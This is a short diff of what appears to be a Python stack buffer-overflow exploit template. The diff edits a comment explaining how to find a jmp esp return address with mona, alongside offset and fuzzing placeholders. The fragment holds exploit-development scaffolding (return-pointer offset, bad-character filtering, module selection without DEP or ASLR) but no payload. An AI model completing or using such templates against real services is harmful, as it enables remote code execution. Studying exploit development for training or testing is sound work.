@@ -10,7 +10,7 @@ s.recv(1024)
 buf_totlen = 2700 #get this from fuzzing
 offset_srp = 2606 #get this from pattern_offset
 
-ptr_jmp_esp =  #get this from !mona jmp -r esp -bpb "\x00\x0A" or !mona find -s "\xff\xe4" -m nameOfFileWIthNoDEPorASLR with with !mona modules
+ptr_jmp_esp =  #get this from !mona jmp -r esp -bpb "\x00\x0A" or !mona find -s "\xff\xe4" -m nameOfFileWIthNoDEPorASLR with with !mona modules. should be in hex format like oxffffff
 
 buf = ''
 buf += 'A'*(offset_srp-len(buf))
